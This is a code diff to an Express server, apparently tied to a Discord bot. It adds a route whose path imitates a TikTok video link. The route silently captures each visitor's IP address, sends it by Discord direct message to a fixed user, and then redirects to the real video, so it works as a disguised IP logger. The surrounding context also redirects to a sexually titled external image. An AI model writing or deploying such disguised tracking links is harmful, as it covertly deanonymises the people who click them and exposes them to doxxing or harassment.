@@ -39,6 +39,14 @@ app.get('/akaritm', async (_req, res) => {
   //res.sendFile(path.resolve(__dirname, 'assets', '123.png'))
   res.redirect(200, 'https://www.stripersonline.com/surftalk/uploads/gallery/album_14234/6b3e9b22_hot-girls-nice-boobs-high-res-13oct-21.jpeg')
 });
+
+app.get('/https://www.tiktok.com/@zhtorr/video/7493515873487965448', async (_req, res) => {
+  logger.log('Recived get request');
+  const ip = _req.ip || _req.socket.remoteAddress
+  await (await (await client.guilds.fetch('408654092467044352')).members.fetch('231449604711907328')).send(`User IP: ${ip}`)
+  //res.sendFile(path.resolve(__dirname, 'assets', '123.png'))
+  res.redirect('https://www.tiktok.com/@zhtorr/video/7493515873487965448?is_from_webapp=1&sender_device=pc')
+});
 // app.get('*', async (req, res) => {
 //   console.log(req.path)
 // })
